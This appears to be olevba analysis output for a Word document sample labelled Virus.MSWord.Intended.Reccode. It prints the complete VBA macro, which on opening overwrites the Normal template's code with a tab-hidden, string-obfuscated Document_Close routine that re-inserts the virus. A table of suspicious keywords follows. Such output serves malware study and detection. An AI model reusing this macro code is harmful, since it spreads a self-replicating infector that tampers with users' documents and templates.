olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Reccode-047db5b3219058d9bc610d56dc7e32123bca2d7f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Reccode-047db5b3219058d9bc610d56dc7e32123bca2d7f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim NTmp As Object
Set NTmp = Normal.ThisDocument
Dim Adc As Object
Set Adc = Project.ThisDocument
Dim TDc As Object
Set TDc = ThisDocument
Set AC = Adc.VBProject.VBComponents(1).CodeModule
Set NC = NTmp.VBProject.VBComponents(1).CodeModule
Set TD = TDc.VBProject.VBComponents(1).CodeModule
NTmp.Variables("RecCode").Value = TD.Lines(1, TD.CountOfLines)
Adc.Variables("RecCode").Value = TD.Lines(1, TD.CountOfLines)
UnstealthA = "With ThisDo" & "cument.VBPr" & "oject." & "VBCompo" & "nents(1" & ").CodeModule: "
UnstealthB = ".DeleteL" & "ines 1" & ", .CountO" & "fLines: "
UnStealthC = ".InsertLin" & "es 1, T" & "hisDo" & "cument.Variab" & "les(1)" & ".Value: "
UnStealthD = "End With"
UnStealth = String(175, Chr(9)) & "If ShowVisualBasicEditor = True Then Exit Sub: " & UnstealthA & UnstealthB & UnStealthC & UnStealthD
NC.DeleteLines 1, NC.CountOfLines: NC.InsertLines 1, "Private Sub Document_Close" & Chr(13) & UnStealth & Chr(13) & "End Sub"
AC.DeleteLines 1, AC.CountOfLines: AC.InsertLines 1, "Private Sub Document_Close" & Chr(13) & UnStealth & Chr(13) & "End Sub"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
+----------+--------------------+---------------------------------------------+

